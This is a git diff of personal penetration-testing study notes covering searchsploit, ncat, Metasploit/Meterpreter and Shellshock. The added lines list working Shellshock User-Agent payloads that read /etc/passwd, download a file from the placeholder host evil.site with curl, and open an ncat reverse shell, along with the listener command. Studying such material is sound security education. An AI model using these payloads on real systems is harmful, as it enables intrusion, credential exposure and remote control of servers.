@@ -411,9 +411,13 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 ## Exploitation
 
-- So far I have only run scans. Gathered Ips and related info on vulnerabilities. Once I have this info now is the time to search for the exploits for these vulnerabilities
+- So far I have only run scans. Gathered Ips and related info on vulnerabilities. Once I have this info now is the time to search for the exploits for these vulnerabilities. 
 
-- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to break into target)
+- This is typically done using `searchsploit` and typing the name of vulnerability to find the payload script
+
+- Then `ncat` is used to establish connection
+
+- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to run scripts on the victim machine)
 
 - Note the difference: Metasploit is run on the hacker's machine, and Meterpreter is run on the victim machine after exploitation is successful. An alternative to Meterpreter are the various payloads available for specific vulnerabilities. I can also create custom payload modules in metasploit
 
@@ -428,7 +432,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - Shell shock is a software that allows you to execute bash script code on a remote server. This is done by exploiting **common gateway interface** which is a protocol that handles requests for running scripts on the server. 
 
-- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables into the HTTP header- which can potentially elevate priviliges and allow:
+- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables (controls how processes are run on a computer) into the HTTP header- which can potentially elevate priviliges and allow:
 
     - Download of sensitive data
     - Send and receive shells to and from the target
@@ -479,6 +483,19 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 
 - `User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'`
+
+- Other manipulation examples
+1. Read `/etc/passwd`.
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'`
+
+2. Use `curl` to download a malicious file from `http://evil.site/mal.php`.
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'`
+
+3. Open a netcat/ncat listener on your host's port `4444`. 
+   - Solution: `ncat -lvp 4444`
+
+4. Send a reverse shell to your port 4444 (in this example, use the IP address `192.168.0.8`). 
+   - Solution: `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.8 4444'`
 
 
 - But before this command can be run, a listening port must be open on the host
